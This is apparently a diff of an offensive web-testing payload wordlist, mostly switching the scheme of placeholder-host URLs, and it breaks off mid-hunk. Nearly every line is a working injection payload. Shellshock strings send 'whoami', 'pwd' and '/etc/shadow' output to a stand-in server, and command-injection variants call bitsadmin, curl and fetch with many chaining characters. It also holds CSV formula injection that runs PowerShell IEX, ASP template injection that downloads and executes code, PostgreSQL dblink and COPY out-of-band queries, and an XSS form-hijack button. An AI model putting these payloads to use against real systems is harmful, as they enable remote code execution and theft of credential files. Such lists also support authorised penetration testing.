+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+'() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+;() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+|() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
+||() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
 () { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
 () { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
@@ -1218,66 +1218,66 @@ bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt 
 ||bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt%00
 |bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt%00
 bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt%00
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-(bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt)
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-`bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt`
-{bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt}
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-"bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-&&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-&bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-'bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-;bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-||bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-|bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
-bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+(bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt)
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+`bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt`
+{bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt}
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+"bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+&&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+&bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+'bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+;bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+||bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+|bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
 "><button name=xss type=submit formaction='https://domain_collab'>I get consumed!
 =cmd|'/C powershell IEX(wget http://domain_collab/domain_csv.txt)'!A0
 =cmd|'/C powershell IEX(wget http://domain_collab/ip_csv.txt)'!A0
@@ -1887,8 +1887,8 @@ CREATE EXTENSION dblink;SeLeCt dblink_connect('host=vps_ip user=postgres passwor
 =CREATE EXTENSION dblink;SeLeCt dblink_connect('host=vps_ip user=postgres password=password dbname=dvdrental');%00
 ||CREATE EXTENSION dblink;SeLeCt dblink_connect('host=vps_ip user=postgres password=password dbname=dvdrental');%00
 CREATE EXTENSION dblink;SeLeCt dblink_connect('host=vps_ip user=postgres password=password dbname=dvdrental');%00
-<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('https://domain_collab:80/ssti_asp.txt')").StdOut.ReadAll() %>
-<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('https://vps_ip:80/ssti_asp.txt')").StdOut.ReadAll() %>
+<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('https://domain_collab/ssti_asp.txt')").StdOut.ReadAll() %>
+<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://vps_ip:80/ssti_asp.txt')").StdOut.ReadAll() %>
  CREATE TABLE test();COPY test FrOm E'\\\\domain_collab\\postgres.txt';
  CREATE TABLE test();COPY test FrOm E'\\\\domain_collab\\postgres.txt'; 
  CREATE TABLE test();COPY test FrOm E'\\\\domain_collab\\postgres.txt';"
@@ -2507,66 +2507,66 @@ curl https://domain_collab/rce_curl.txt%00
 && curl https://domain_collab/.testing/rce_vuln.txt
 ; curl https://domain_collab/.testing/rce_vuln.txt
  curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://domain_collab/.testing/rce_vuln.txt` #' |curl https://domain_collab/.testing/rce_vuln.txt||`curl https://domain_collab/.testing/rce_vuln.txt` #\" |curl https://domain_collab/.testing/rce_vuln.txt
-"curl https://vps_ip:80/rce_curl.txt#
-"curl https://vps_ip:80/rce_curl.txt&
-"curl https://vps_ip:80/rce_curl.txt&&
-"curl https://vps_ip:80/rce_curl.txt;
-"curl https://vps_ip:80/rce_curl.txt|
-"curl https://vps_ip:80/rce_curl.txt||
-&&curl https://vps_ip:80/rce_curl.txt#
-&&curl https://vps_ip:80/rce_curl.txt&
-&&curl https://vps_ip:80/rce_curl.txt&&
-&&curl https://vps_ip:80/rce_curl.txt;
-&&curl https://vps_ip:80/rce_curl.txt|
-&&curl https://vps_ip:80/rce_curl.txt||
-&curl https://vps_ip:80/rce_curl.txt#
-&curl https://vps_ip:80/rce_curl.txt&
-&curl https://vps_ip:80/rce_curl.txt&&
-&curl https://vps_ip:80/rce_curl.txt;
-&curl https://vps_ip:80/rce_curl.txt|
-&curl https://vps_ip:80/rce_curl.txt||
-'curl https://vps_ip:80/rce_curl.txt#
-'curl https://vps_ip:80/rce_curl.txt&
-'curl https://vps_ip:80/rce_curl.txt&&
-'curl https://vps_ip:80/rce_curl.txt;
-'curl https://vps_ip:80/rce_curl.txt|
-'curl https://vps_ip:80/rce_curl.txt||
-(curl https://vps_ip:80/rce_curl.txt)
-;curl https://vps_ip:80/rce_curl.txt#
-;curl https://vps_ip:80/rce_curl.txt&
-;curl https://vps_ip:80/rce_curl.txt&&
-;curl https://vps_ip:80/rce_curl.txt;
-;curl https://vps_ip:80/rce_curl.txt|
-;curl https://vps_ip:80/rce_curl.txt||
-`curl https://vps_ip:80/rce_curl.txt`
-{curl https://vps_ip:80/rce_curl.txt}
-||curl https://vps_ip:80/rce_curl.txt#
-||curl https://vps_ip:80/rce_curl.txt&
-||curl https://vps_ip:80/rce_curl.txt&&
-||curl https://vps_ip:80/rce_curl.txt;
-||curl https://vps_ip:80/rce_curl.txt|
-||curl https://vps_ip:80/rce_curl.txt||
-|curl https://vps_ip:80/rce_curl.txt#
-|curl https://vps_ip:80/rce_curl.txt&
-|curl https://vps_ip:80/rce_curl.txt&&
-|curl https://vps_ip:80/rce_curl.txt;
-|curl https://vps_ip:80/rce_curl.txt|
-|curl https://vps_ip:80/rce_curl.txt||
-curl https://vps_ip:80/rce_curl.txt
-curl https://vps_ip:80/rce_curl.txt#
-curl https://vps_ip:80/rce_curl.txt&
-curl https://vps_ip:80/rce_curl.txt&&
-curl https://vps_ip:80/rce_curl.txt;
-curl https://vps_ip:80/rce_curl.txt|
-curl https://vps_ip:80/rce_curl.txt||
-"curl https://vps_ip:80/rce_curl.txt%00
-&&curl https://vps_ip:80/rce_curl.txt%00
-&curl https://vps_ip:80/rce_curl.txt%00
-'curl https://vps_ip:80/rce_curl.txt%00
-;curl https://vps_ip:80/rce_curl.txt%00
-||curl https://vps_ip:80/rce_curl.txt%00
-|curl https://vps_ip:80/rce_curl.txt%00
-curl https://vps_ip:80/rce_curl.txt%00
+"curl http://vps_ip:80/rce_curl.txt#
+"curl http://vps_ip:80/rce_curl.txt&
+"curl http://vps_ip:80/rce_curl.txt&&
+"curl http://vps_ip:80/rce_curl.txt;
+"curl http://vps_ip:80/rce_curl.txt|
+"curl http://vps_ip:80/rce_curl.txt||
+&&curl http://vps_ip:80/rce_curl.txt#
+&&curl http://vps_ip:80/rce_curl.txt&
+&&curl http://vps_ip:80/rce_curl.txt&&
+&&curl http://vps_ip:80/rce_curl.txt;
+&&curl http://vps_ip:80/rce_curl.txt|
+&&curl http://vps_ip:80/rce_curl.txt||
+&curl http://vps_ip:80/rce_curl.txt#
+&curl http://vps_ip:80/rce_curl.txt&
+&curl http://vps_ip:80/rce_curl.txt&&
+&curl http://vps_ip:80/rce_curl.txt;
+&curl http://vps_ip:80/rce_curl.txt|
+&curl http://vps_ip:80/rce_curl.txt||
+'curl http://vps_ip:80/rce_curl.txt#
+'curl http://vps_ip:80/rce_curl.txt&
+'curl http://vps_ip:80/rce_curl.txt&&
+'curl http://vps_ip:80/rce_curl.txt;
+'curl http://vps_ip:80/rce_curl.txt|
+'curl http://vps_ip:80/rce_curl.txt||
+(curl http://vps_ip:80/rce_curl.txt)
+;curl http://vps_ip:80/rce_curl.txt#
+;curl http://vps_ip:80/rce_curl.txt&
+;curl http://vps_ip:80/rce_curl.txt&&
+;curl http://vps_ip:80/rce_curl.txt;
+;curl http://vps_ip:80/rce_curl.txt|
+;curl http://vps_ip:80/rce_curl.txt||
+`curl http://vps_ip:80/rce_curl.txt`
+{curl http://vps_ip:80/rce_curl.txt}
+||curl http://vps_ip:80/rce_curl.txt#
+||curl http://vps_ip:80/rce_curl.txt&
+||curl http://vps_ip:80/rce_curl.txt&&
+||curl http://vps_ip:80/rce_curl.txt;
+||curl http://vps_ip:80/rce_curl.txt|
+||curl http://vps_ip:80/rce_curl.txt||
+|curl http://vps_ip:80/rce_curl.txt#
+|curl http://vps_ip:80/rce_curl.txt&
+|curl http://vps_ip:80/rce_curl.txt&&
+|curl http://vps_ip:80/rce_curl.txt;
+|curl http://vps_ip:80/rce_curl.txt|
+|curl http://vps_ip:80/rce_curl.txt||
+curl http://vps_ip:80/rce_curl.txt
+curl http://vps_ip:80/rce_curl.txt#
+curl http://vps_ip:80/rce_curl.txt&
+curl http://vps_ip:80/rce_curl.txt&&
+curl http://vps_ip:80/rce_curl.txt;
+curl http://vps_ip:80/rce_curl.txt|
+curl http://vps_ip:80/rce_curl.txt||
+"curl http://vps_ip:80/rce_curl.txt%00
+&&curl http://vps_ip:80/rce_curl.txt%00
+&curl http://vps_ip:80/rce_curl.txt%00
+'curl http://vps_ip:80/rce_curl.txt%00
+;curl http://vps_ip:80/rce_curl.txt%00
+||curl http://vps_ip:80/rce_curl.txt%00
+|curl http://vps_ip:80/rce_curl.txt%00
+curl http://vps_ip:80/rce_curl.txt%00
 & curl http://vps_ip:80/.testing/rce.txt
 | curl http://vps_ip:80/.testing/rce.txt
 curl http://vps_ip:80/.testing/rce_vuln.txt
@@ -3300,66 +3300,66 @@ fetch https://domain_collab/fetch.txt||
 ||fetch https://domain_collab/fetch.txt%00
 |fetch https://domain_collab/fetch.txt%00
 fetch https://domain_collab/fetch.txt%00
-"fetch https://vps_ip:80/fetch.txt#
-"fetch https://vps_ip:80/fetch.txt&
-"fetch https://vps_ip:80/fetch.txt&&
-"fetch https://vps_ip:80/fetch.txt;
-"fetch https://vps_ip:80/fetch.txt|
-"fetch https://vps_ip:80/fetch.txt||
-&&fetch https://vps_ip:80/fetch.txt#
-&&fetch https://vps_ip:80/fetch.txt&
-&&fetch https://vps_ip:80/fetch.txt&&
-&&fetch https://vps_ip:80/fetch.txt;
-&&fetch https://vps_ip:80/fetch.txt|
-&&fetch https://vps_ip:80/fetch.txt||
-&fetch https://vps_ip:80/fetch.txt#
-&fetch https://vps_ip:80/fetch.txt&
-&fetch https://vps_ip:80/fetch.txt&&
-&fetch https://vps_ip:80/fetch.txt;
-&fetch https://vps_ip:80/fetch.txt|
-&fetch https://vps_ip:80/fetch.txt||
-'fetch https://vps_ip:80/fetch.txt#
-'fetch https://vps_ip:80/fetch.txt&
-'fetch https://vps_ip:80/fetch.txt&&
-'fetch https://vps_ip:80/fetch.txt;
-'fetch https://vps_ip:80/fetch.txt|
-'fetch https://vps_ip:80/fetch.txt||
-(fetch https://vps_ip:80/fetch.txt)
-;fetch https://vps_ip:80/fetch.txt#
-;fetch https://vps_ip:80/fetch.txt&
-;fetch https://vps_ip:80/fetch.txt&&
-;fetch https://vps_ip:80/fetch.txt;
-;fetch https://vps_ip:80/fetch.txt|
-;fetch https://vps_ip:80/fetch.txt||
-`fetch https://vps_ip:80/fetch.txt`
-{fetch https://vps_ip:80/fetch.txt}
-||fetch https://vps_ip:80/fetch.txt#
-||fetch https://vps_ip:80/fetch.txt&
-||fetch https://vps_ip:80/fetch.txt&&
-||fetch https://vps_ip:80/fetch.txt;
-||fetch https://vps_ip:80/fetch.txt|
-||fetch https://vps_ip:80/fetch.txt||
-|fetch https://vps_ip:80/fetch.txt#
-|fetch https://vps_ip:80/fetch.txt&
-|fetch https://vps_ip:80/fetch.txt&&
-|fetch https://vps_ip:80/fetch.txt;
-|fetch https://vps_ip:80/fetch.txt|
-|fetch https://vps_ip:80/fetch.txt||
-fetch https://vps_ip:80/fetch.txt
-fetch https://vps_ip:80/fetch.txt#
-fetch https://vps_ip:80/fetch.txt&
-fetch https://vps_ip:80/fetch.txt&&
-fetch https://vps_ip:80/fetch.txt;
-fetch https://vps_ip:80/fetch.txt|
-fetch https://vps_ip:80/fetch.txt||
-"fetch https://vps_ip:80/fetch.txt%00
-&&fetch https://vps_ip:80/fetch.txt%00
-&fetch https://vps_ip:80/fetch.txt%00
-'fetch https://vps_ip:80/fetch.txt%00
-;fetch https://vps_ip:80/fetch.txt%00
-||fetch https://vps_ip:80/fetch.txt%00
-|fetch https://vps_ip:80/fetch.txt%00
-fetch https://vps_ip:80/fetch.txt%00
+"fetch http://vps_ip:80/fetch.txt#
+"fetch http://vps_ip:80/fetch.txt&
+"fetch http://vps_ip:80/fetch.txt&&
+"fetch http://vps_ip:80/fetch.txt;
+"fetch http://vps_ip:80/fetch.txt|
+"fetch http://vps_ip:80/fetch.txt||
+&&fetch http://vps_ip:80/fetch.txt#
+&&fetch http://vps_ip:80/fetch.txt&
+&&fetch http://vps_ip:80/fetch.txt&&
+&&fetch http://vps_ip:80/fetch.txt;
+&&fetch http://vps_ip:80/fetch.txt|
+&&fetch http://vps_ip:80/fetch.txt||
+&fetch http://vps_ip:80/fetch.txt#
+&fetch http://vps_ip:80/fetch.txt&
+&fetch http://vps_ip:80/fetch.txt&&
+&fetch http://vps_ip:80/fetch.txt;
+&fetch http://vps_ip:80/fetch.txt|
+&fetch http://vps_ip:80/fetch.txt||
+'fetch http://vps_ip:80/fetch.txt#
